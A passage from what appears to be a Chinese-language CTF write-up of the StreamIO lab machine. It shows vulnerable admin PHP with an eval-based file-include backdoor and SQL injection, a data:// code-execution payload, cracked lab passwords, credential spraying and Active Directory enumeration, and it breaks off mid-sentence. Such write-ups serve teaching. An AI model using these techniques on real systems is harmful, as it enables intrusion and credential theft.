class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">movie_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">Staff</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class"><span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1 &quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">staff_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">success</span>&quot;&gt; <span class="title">Message</span> <span class="title">sent</span> <span class="title">to</span> <span class="title">administrator</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">while</span>($<span class="title">row</span> = <span class="title">sqlsrv_fetch_array</span>($<span class="title">res</span>, <span class="title">SQLSRV_FETCH_ASSOC</span>))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">staff_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">User</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class"><span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">user_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from users where is_staff = 0 and id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where is_staff = 0&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">include</span>&quot; <span class="title">hidden</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">include</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意看最下面这部分php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假设我们传入的include参数是<code>data://text/plain,phpinfo();</code>，那么经过<code>file_get_contents()</code>函数的处理再传给eval函数，不就直接执行了phpinfo()了吗？我们试一下：</p><p><a href="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg"></a></p><p>果不其然，出现了phpinfo。那接下来更改<code>phpinfo();</code>为<code>system(&#39;command&#39;)</code>即可执行任意命令。我这里是上传了一个webshell，然后利用蚁剑连接。当前用户是<code>yoshihide</code>且没有家目录，仅用于Web应用操作。之后审计了一下代码，得到了两对mssql的账号密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#C:/inetpub/streamio.htb/admin/index.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_admin&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hx31234567890&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#C:/inetpub/watch.streamio.htb/search.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_user&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hB1@hB1@h&#x27;</span>);</span><br></pre></td></tr></table></figure><p>利用蚁剑的数据操作的功能，可以直接连接到mssql（也可以实验sqlcmd连接，执行where.exe sqlcmd即可找到sqlcmd的位置），查看streamio_backup表中的数据：</p><p><a href="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg"></a></p><p>可以看到有一条username为nikk37的数据，利用蚁剑的导出功能导出结果，得到了一个csv文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> 10.10.11.158_20231210123309.csv </span><br><span class="line"><span class="built_in">id</span>,username,password</span><br><span class="line">8,Sabrina,f87d3c0d6c8fd686aacc6627f1f493a5</span><br><span class="line">7,William,d62be0dc82071bccc1322d64ec5b6c51</span><br><span class="line">6,Lauren,08344b85b329d7efd611b7a7743e8a09</span><br><span class="line">5,Samantha,083ffae904143c4796e464dac33c1f7d</span><br><span class="line">4,Theodore,925e5408ecb67aea449373d668b7359e</span><br><span class="line">3,James,c660060492d9edcaa8332d89c99c9239</span><br><span class="line">2,yoshihide,b779ba15cedfd22a023c4d8bcf5f2332</span><br><span class="line">1,nikk37,389d14cb8e4e9b94b137deb1caf0612a</span><br></pre></td></tr></table></figure><p>依然对数据进行处理，并爆破密码，结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashcat account /usr/share/wordlists/rockyou.txt --username -m 0 --show </span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com</span><br></pre></td></tr></table></figure><p>尝试利用evil-winrm和<code>nikk37:get_dem_girls2@yahoo.com</code>进行登录，成功登录：</p><p><a href="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg"></a></p><h2 id="GetAdministrator"><a href="#GetAdministrator" class="headerlink" title="GetAdministrator"></a>GetAdministrator</h2><p>首先上传一个SharpHound.exe进行信息收集：</p><p><a href="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg"></a></p><p>接着下载生成的zip文件并导入到BloodHound：</p><p><a href="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg"></a></p><p>图中所指的用户为jdgodd，所指的组为core staff。可以看到jdgodd对core staff有writeowner的权限，而core staff的组成员可以读取LAPS的密码。我们可以看到core staff组中是没有成员的：</p><p><a href="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg"></a></p><p>因此我们此时的思路是拿到jdgodd的密码然后登录到DC，之后将jdgodd或者nikk37添加到core staff组中，最后dump LAPS密码。那首先进行我们的第一步，找到jdgodd密码。上传一个Winpeas运行一下，看看能不能找到线索：</p><p><a href="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg"></a></p><p>可以看到，这台电脑安装了firefox且找到了firefox的凭据文件，可以利用<a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a>把密码dump出来：</p><p><a href="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg"></a></p><p>下载下来并解压后，就可以看到密码了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> results/firefox_br53rxeg_default_release_password.json </span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;JDgodd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;password@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:51-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;yoshihide&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;paddpadd@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:24-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;nikk37&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;n1kk1sd0p3t00:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:10-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:40:56-08:00&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是直接利用<code>JDgodd:password@12</code>无法认证成功，似乎还需要我们重新爆破一下。整理一下账号密码：</p><p><a href="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg"></a></p><p>利用cme爆破一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec smb 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure><p>得到账号密码：<code>streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</code>，但是得到了这组账号密码我们仍然无法利用evil-winrm成功登录。用cme的爆破一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec winrm 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)</span><br><span class="line">HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r</span><br></pre></td></tr></table></figure><p>不难发现，JDgodd这个账户我们没法远程登录。那利用bloodhound-python远程收集一波信息吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bloodhound-python -d streamio.htb -u JDgodd -p &quot;JDg0dd1s@d0p3cr3@t0r&quot;  -c All  -ns 10.10.11.158 -dc streamio.htb --zip </span></span><br><span class="line">INFO: Found AD domain: streamio.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 8 <span class="built_in">users</span></span><br><span class="line">INFO: Found 54 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 4 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC.streamIO.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 20S</span><br><span class="line">INFO: Compressing output into 20231210133117_bloodhound.zip</span><br></pre></td></tr></table></figure><p>导入到BloodHound中，可以找到解决办法：</p><p><a href="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg"></a></p><p>BloodHound告诉我们可以使用PowerView中的Add-DomainObjectAcl函数来向core 